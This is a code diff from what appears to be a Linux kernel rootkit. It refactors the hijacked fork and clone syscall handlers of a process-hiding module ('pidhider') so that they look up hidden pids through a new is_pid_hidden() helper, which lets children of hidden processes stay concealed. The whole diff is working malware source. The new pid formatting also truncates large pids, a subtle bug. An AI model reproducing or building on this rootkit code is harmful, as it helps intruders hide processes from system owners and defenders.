@@ -164,19 +164,13 @@ void pidhider_cleanup(void)
 
 static long thor_fork(void)
 {
-    struct _pid_list *tmp;
     bool hidden = false;
     long ret;
+    char pidname[6];
 
     /* check if process calling fork is hidden */
-    list_for_each_entry(tmp, &(pid_list.list), list) {
-        int pid;
-        kstrtoint(tmp->name, 10, &pid);
-        if (pid == current->pid) {
-            LOG_DEBUG("(thor_fork) mother process hidden");
-            hidden = true;
-        }
-    }
+    snprintf(pidname, 6, "%hu", current->pid);
+    hidden = is_pid_hidden(pidname);
 
     unhijack(sys_fork);
     ret = sys_fork();
@@ -217,19 +211,13 @@ long thor_clone(unsigned long clone_flags, unsigned long newsp,
                 int tls_val)
 # endif
 {
-    struct _pid_list *tmp;
     bool hidden = false;
     long ret;
+    char pidname[6];
 
     /* check if process calling clone is hidden */
-    list_for_each_entry(tmp, &(pid_list.list), list) {
-        int pid;
-        kstrtoint(tmp->name, 10, &pid);
-        if (pid == current->pid) {
-            LOG_DEBUG("(thor_clone) mother process hidden");
-            hidden = true;
-        }
-    }
+    snprintf(pidname, 6, "%hu", current->pid);
+    hidden = is_pid_hidden(pidname);
 
     unhijack(sys_clone);
 # ifdef CONFIG_CLONE_BACKWARDS
@@ -355,3 +343,17 @@ void clear_pid_list(void)
         kfree(tmp);
     }
 }
+
+bool is_pid_hidden(const char *name)
+{
+    struct _pid_list *tmp;
+
+    list_for_each_entry(tmp, &(pid_list.list), list) {
+        if (strcmp(name, tmp->name) == 0) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
